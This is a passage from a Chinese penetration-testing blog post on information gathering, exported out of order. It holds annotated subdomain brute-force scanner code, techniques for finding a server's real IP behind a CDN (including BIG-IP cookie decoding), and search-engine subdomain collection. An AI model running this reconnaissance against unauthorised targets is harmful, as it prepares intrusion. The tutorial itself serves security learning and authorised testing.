class=\"title function_\">check_https_alt_names</span>(<span class=\"params\">self, domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 建立异步HTTPS连接</span></span><br><span class=\"line\">            reader, _ = <span class=\"keyword\">await</span> asyncio.open_connection(</span><br><span class=\"line\">                host=domain,</span><br><span class=\"line\">                port=<span class=\"number\">443</span>,</span><br><span class=\"line\">                ssl=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                server_hostname=domain,</span><br><span class=\"line\">            )</span><br><span class=\"line\">            <span class=\"comment\"># 获取证书详细信息</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reader._transport.get_extra_info(<span class=\"string\">'peercert'</span>)[<span class=\"string\">'subjectAltName'</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> item[<span class=\"number\">0</span>].upper() == <span class=\"string\">'DNS'</span>:</span><br><span class=\"line\">                    name = item[<span class=\"number\">1</span>].lower()</span><br><span class=\"line\">                    <span class=\"comment\"># 筛选符合条件的子域名</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> name.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                        sub = name[:<span class=\"built_in\">len</span>(name) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                        sub = sub.replace(<span class=\"string\">'*'</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">                        sub = sub.strip(<span class=\"string\">'.'</span>)</span><br><span class=\"line\">                        <span class=\"comment\"># 去重并添加到任务队列</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">                                sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.cert_subs:</span><br><span class=\"line\">                            <span class=\"variable language_\">self</span>.cert_subs.add(sub)</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询DNS解析结果，并限制查询的超时时间</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">do_query</span>(<span class=\"params\">self, j, cur_domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.resolvers[j].resolve(cur_domain, <span class=\"string\">'A'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 扫描</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">scan</span>(<span class=\"params\">self, j</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 设置DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers[j].nameservers = [<span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.dns_count &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                s = random.choice(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> s != <span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.resolvers[j].nameservers.append(s)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 处理子域</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                brace_count, sub = <span class=\"variable language_\">self</span>.queue.get_nowait()</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">'1'</span></span><br><span class=\"line\">                empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> asyncio.queues.QueueEmpty <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                empty_counter += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> empty_counter &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">'0'</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'1'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 对于带有通配符的子域进行处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                brace_count -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">'{next_sub}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub.replace(<span class=\"string\">'{next_sub}'</span>, _)))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">'{alphnum}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{alphnum}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">'{alpha}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{alpha}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">'{num}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'0123456789'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{num}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                cur_domain = sub + <span class=\"string\">'.'</span> + <span class=\"variable language_\">self</span>.domain</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 执行DNS查询</span></span><br><span class=\"line\">                answers = <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, cur_domain)</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 处理DNS查询结果，排除无效IP</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> answers:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_subs.add(sub)</span><br><span class=\"line\">                    ips = <span class=\"string\">', '</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">                    invalid_ip_found = <span class=\"literal\">False</span></span><br><span class=\"line\">                    <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> answer.address <span class=\"keyword\">in</span> [<span class=\"string\">'1.1.1.1'</span>, <span class=\"string\">'127.0.0.1'</span>, <span class=\"string\">'0.0.0.0'</span>, <span class=\"string\">'0.0.0.1'</span>]:</span><br><span class=\"line\">                            invalid_ip_found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> invalid_ip_found:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.i <span class=\"keyword\">and</span> is_intranet(answers[<span class=\"number\">0</span>].host):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 查询CNAME记录</span></span><br><span class=\"line\">                        cname = <span class=\"built_in\">str</span>(answers.canonical_name)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> cname != cur_domain <span class=\"keyword\">and</span> cname.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                            cname_sub = cname[:<span class=\"built_in\">len</span>(cname) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, cname_sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    first_level_sub = sub.split(<span class=\"string\">'.'</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">                    max_found = <span class=\"number\">20</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.w:</span><br><span class=\"line\">                        first_level_sub = <span class=\"string\">''</span></span><br><span class=\"line\">                        max_found = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (first_level_sub, ips) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.ip_dict:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] = <span class=\"number\">1</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] &gt; max_found:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_count_local += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 将查询结果写入文件</span></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.write(cur_domain.ljust(<span class=\"number\">30</span>) + <span class=\"string\">'\\t'</span> + ips + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 检查HTTPS证书</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"variable language_\">self</span>.options.no_cert_check:</span><br><span class=\"line\">                        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.0</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.check_https_alt_names(cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, <span class=\"string\">'lijiejie-test-not-existed.'</span> + cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">except</span> dns.resolver.NXDOMAIN <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.queue.qsize() &lt; <span class=\"number\">20000</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _ + <span class=\"string\">'.'</span> + sub))</span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">1</span>, <span class=\"string\">'{next_sub}.'</span> + sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> dns.resolver.NoNameservers <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.no_server_subs[sub] = <span class=\"variable language_\">self</span>.no_server_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.no_server_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.exception.Timeout, dns.resolver.LifetimeTimeout) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.timeout_subs[sub] = <span class=\"variable language_\">self</span>.timeout_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.timeout_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">type</span>(e)).find(<span class=\"string\">'asyncio.exceptions.TimeoutError'</span>) &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">'errors.log'</span>, <span class=\"string\">'a'</span>) <span class=\"keyword\">as</span> errFile:</span><br><span class=\"line\">                        errFile.write(<span class=\"string\">'[%s] %s\\n'</span> % (<span class=\"built_in\">type</span>(e), <span class=\"built_in\">str</span>(e)))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.load_sub_names()</span><br><span class=\"line\">        tasks = [<span class=\"variable language_\">self</span>.scan(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        tasks.insert(<span class=\"number\">0</span>, <span class=\"variable language_\">self</span>.update_counter())</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.gather(*tasks)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        loop = asyncio.get_event_loop()</span><br><span class=\"line\">        asyncio.set_event_loop(loop)</span><br><span class=\"line\">        loop.run_until_complete(<span class=\"variable language_\">self</span>.async_run())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_process</span>(<span class=\"params\">*params</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 信号处理器</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, user_abort)</span><br><span class=\"line\">    <span class=\"comment\"># 调用SubNameBrute的run方法</span></span><br><span class=\"line\">    s = SubNameBrute(*params)</span><br><span class=\"line\">    s.run()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 根据option.process启动多个进程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> process_num <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(options.process):</span><br><span class=\"line\">    p = multiprocessing.Process(</span><br><span class=\"line\">        <span class=\"comment\"># 调用run_process进行扫描</span></span><br><span class=\"line\">        target=run_process,</span><br><span class=\"line\">        args=(domain, options, process_num, dns_servers, next_subs,</span><br><span class=\"line\">              scan_count, found_count, queue_size_array, tmp_dir)</span><br><span class=\"line\">    )</span><br><span class=\"line\">    all_process.append(p)</span><br><span class=\"line\">    p.start()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>总体的工作路径为：</p>\n<ul>\n<li><strong>加载子域名</strong>：从文件中读取子域名，识别通配符，放入任务队列</li>\n<li>扫描子域<ul>\n<li>多线程扫描子域</li>\n<li>对每个子域执行DNS查询，处理返回结果</li>\n<li>对子域名进行证书检查，CNAME解析等附加操作</li>\n</ul>\n</li>\n<li><strong>记录结果</strong></li>\n<li><strong>错误处理与重试</strong>：对于DNS查询失败的子域进行重试，最多三次</li>\n</ul>\n<p>这里有个证书检查和CNAME解析，还有一个称呼叫<strong>证书透明度</strong>主要原因是<strong>提高全面性</strong>。在<strong>SSL/TLS</strong>证书中的<code>subjectAltName</code>字段会暴露一些隐藏子域。<strong>CNAME</strong>是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。</p>\n<p><strong>对于通配符子域名的处理</strong>：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。</p>\n","length":14974,"excerpt":"","more":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><blockquote>\n<p>信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。</p>\n</blockquote>\n<h2 id=\"域名（Domain）\"><a href=\"#域名（Domain）\" class=\"headerlink\" title=\"域名（Domain）\"></a>域名（Domain）</h2><blockquote>\n<p>域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。</p>\n</blockquote>\n<h3 id=\"判断CDN\"><a href=\"#判断CDN\" class=\"headerlink\" title=\"判断CDN\"></a>判断CDN</h3><p>内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？</p>\n<p>CDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。</p>\n<p><strong>ping域名判断是否有CDN</strong></p>\n<p>当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png\" alt=\"img\"></p>\n<p><strong>nslookup判断CDN</strong></p>\n<p>nslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。</p>\n<p>通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png\" alt=\"img\"></p>\n<p><strong>多地ping判断CDN</strong></p>\n<p><a href=\"https://ping.chinaz.com/\">站长工具</a>还是比较直观的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png\" alt=\"img\"></p>\n<h3 id=\"查看真实IP\"><a href=\"#查看真实IP\" class=\"headerlink\" title=\"查看真实IP\"></a>查看真实IP</h3><p>检测完CDN，就该绕过CDN检测了，获取真实IP</p>\n<p><strong>多地ping</strong></p>\n<p>不仅是检测CDN，同时也可以用来判断。</p>\n<p>如<code>www.youzan.com</code>，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png\" alt=\"img\"></p>\n<p><strong>子域名查询真实IP</strong></p>\n<p>CDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。</p>\n<p><strong>DNS历史记录</strong></p>\n<p>查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，<a href=\"https://viewdns.info/\">Viewdns</a>或者之前的开发工具都可以查询</p>\n<p><strong>SSL证书</strong></p>\n<p>加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。</p>\n<p><strong>漏洞查找</strong></p>\n<ul>\n<li>敏感文件泄露，如phpinfo等，github信息泄露等。</li>\n<li>XSS、命令执行、SSRF等。</li>\n<li>社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。</li>\n</ul>\n<p><strong>网站邮件</strong></p>\n<p>很多网站都自带<code>sendmail</code>，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP</p>\n<p><strong>F5 LTM解码</strong></p>\n<p>当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: BIGipServerpool_<span class=\"number\">8.29_8030</span>=<span class=\"number\">487098378</span>.<span class=\"number\">24095.0000</span></span><br><span class=\"line\">先把第一小节的十进制数取出来：<span class=\"number\">487098378</span></span><br><span class=\"line\">再转化为十六进制数：<span class=\"number\">1d</span>08880a</span><br><span class=\"line\">从后至前取四位数：<span class=\"number\">0</span>a.<span class=\"number\">88</span>.<span class=\"number\">08</span>.<span class=\"number\">1d</span></span><br><span class=\"line\">转化为十进制即为IP：<span class=\"number\">10.136.8.29</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p>在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。</p>\n<p><strong>搜索引擎收集</strong></p>\n<p>使用谷歌语法等可以收集大量信息，如<code>site:domain</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png\" alt=\"img\"></p>\n<p>尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write to file</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_file</span>(<span class=\"params\">file_path, content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_path, <span class=\"string\">&#x27;a&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">            file.write(content + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    